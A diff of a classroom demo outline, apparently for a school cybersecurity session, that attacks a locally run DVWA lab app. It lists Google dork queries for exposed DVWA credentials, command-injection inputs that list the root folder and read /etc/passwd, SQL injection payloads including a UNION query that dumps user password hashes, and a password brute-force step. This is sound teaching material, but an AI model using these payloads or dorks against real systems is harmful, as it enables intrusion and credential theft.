@@ -28,26 +28,32 @@ NSCC Demo for École acadienne de Truro
   * Always update
 
 ### Step 1 | Recon (15 Min)
-* Google Dorking Demo
+* [Google Dorking](https://github.com/chr3st5an/Google-Dorking) Demo
     1. `allintext: "DVWA" "username" "password"`
     2. `allintext:"DVWA" filetype:pdf`
     3. 
 * Identify a Target
-    * We'll create our own! \
-    `docker run --rm -it -p 80:80 vulnerables/web-dvwa`
-* Just Browsing http://localhost
-* Vulnerbility Scanning (just an exmaple)
-     * ZAP Screenshot
+  * We'll just create our own!
+    * `docker run --rm -it -p 80:80 vulnerables/web-dvwa`
+    * Just Browsing http://localhost
+    * Click **Login** and then click **Create/Reset Database**. 
+
 
 ### Step 2 | Attack (20Min)
 * Browser based attacks
     1. Command Injection \
-    `127.0.0.1; ls -la /`
+    `127.0.0.1; ls -la /` \
+    `127.0.0.1 ; cat /etc/passwd | tee /tmp/passwd`
     2. SQL Injection \
-    `1' OR '1'='1'#`
-    3. XSS (Reflected)
+    `1' OR '1'='1'#` \
+    `%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #`
 * Advanced Attacks (Automation Demo) \
-  https://github.com/In3tinct/DVWA-Automation
+  * Password Brute Force
+    * Let's use brute.py
+    * We'll specify our target. (Line 53)
+    * We need to know usernames (line 48)
+    * We need a dictionary of common passwords. (line 113) \
+    `./brute.py`
 
 
 
